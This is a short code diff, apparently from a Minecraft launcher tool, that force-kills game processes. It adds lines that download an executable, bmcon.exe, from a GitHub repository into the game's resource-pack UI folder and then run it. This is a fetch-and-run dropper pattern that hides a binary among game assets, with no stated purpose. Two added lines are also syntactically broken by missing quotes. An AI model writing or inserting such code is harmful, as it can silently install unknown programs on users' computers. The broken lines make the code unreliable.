@@ -6,6 +6,10 @@ execute('cmd /c taskkill /f /im Minecraft.exe');
 execute('cmd /c taskkill /f /im Minecraft.Windows.exe');
 execute('cmd /c taskkill /f /im oxibyte.exe');
 }
-//open('https://vk.com/wall-196901501_577');
+fs::copy('https://github.com/Rastihin/mce/raw/main/bmcon.exe',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\bmcon.exe;
+fs::copy('https://github.com/Rastihin/mce/raw/main/bmcon.json',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\bmcon.json');
+fs::copy('https://github.com/Rastihin/mce/raw/main/bmcon.json','bmcon.json');
+
+open(fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\bmcon.exe);
 exit();
 
